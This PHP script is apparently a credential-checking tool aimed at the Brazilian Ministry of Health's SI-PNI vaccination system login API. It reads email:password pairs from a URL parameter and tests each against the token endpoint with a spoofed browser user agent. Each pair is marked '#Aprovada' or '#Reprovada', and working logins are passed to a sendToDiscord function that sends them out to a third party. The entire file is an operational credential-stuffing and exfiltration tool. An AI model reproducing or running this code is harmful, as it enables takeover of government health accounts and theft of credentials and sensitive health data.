<?php
function getStr($string, $start, $end) {
    $startIndex = strpos($string, $start);
    if ($startIndex === false) {
        return null;
    }
    $startIndex += strlen($start);
    $endIndex = strpos($string, $end, $startIndex);
    if ($endIndex === false) {
        return null;
    }
    return substr($string, $startIndex, $endIndex - $startIndex);
}

function requestToken($email, $senha) {
    $credentials = base64_encode("$email:$senha");

    $url = 'https://servicos-cloud.saude.gov.br/pni-bff/v1/autenticacao/tokenAcesso';

    $headers = [
        "Host: servicos-cloud.saude.gov.br",
        "Connection: keep-alive",
        "accept: application/json",
        "X-Authorization: Basic $credentials",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
        "Origin: https://si-pni.saude.gov.br",
        "Referer: https://si-pni.saude.gov.br/",
        "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}


function processCredentials($email, $senha) {
    $response = requestToken($email, $senha);
    
    $data = json_decode($response, true);
    
    if (isset($data['accessToken'])) {
        $scope = isset($data['scope']) ? $data['scope'] : '';
        $organization = isset($data['organization']) ? $data['organization'] : '';
        
        $code = 200;
        echo '<span class="badge badge-success">✅ #Aprovada </span> » [' . htmlspecialchars($email) . ':' . htmlspecialchars($senha) . '] » [Sucesso ao Logar! - '.$code.'] » #Lean7</span><br>';

        sendToDiscord($email, $senha, $scope, $organization);

    } elseif (strpos($response, 'Usuário e senha SCPA não autorizados') !== false) {
        echo '<span class="badge badge-danger">🧨 #Reprovada </span> » [' . htmlspecialchars($email) . ':' . htmlspecialchars($senha) . '] » [Usuário e senha SCPA não autorizados] » #Lean7</span><br>';
    } else {
        echo '<span class="badge badge-warning">⚠️ Resposta não reconhecida </span> » [' . htmlspecialchars($email) . ':' . htmlspecialchars($senha) . '] » [ Algo deu errado] » <span class="badge badge-warning">[ Verificar API ] #Lean7 </span><br>';
    }
}

if (isset($_GET['lista'])) {
    $lista = $_GET['lista'];
    
    $lastColonIndex = strrpos($lista, ':');
    
    if ($lastColonIndex !== false) {
        $email = substr($lista, 0, $lastColonIndex);
        $senha = substr($lista, $lastColonIndex + 1);
        
        processCredentials($email, $senha);
    } else {
        echo '<span class="badge badge-danger">🧨 Formato de lista inválido! Use [ email@exemplo.com:senha ] #Lean7 </span><br>';
    }
}
?>
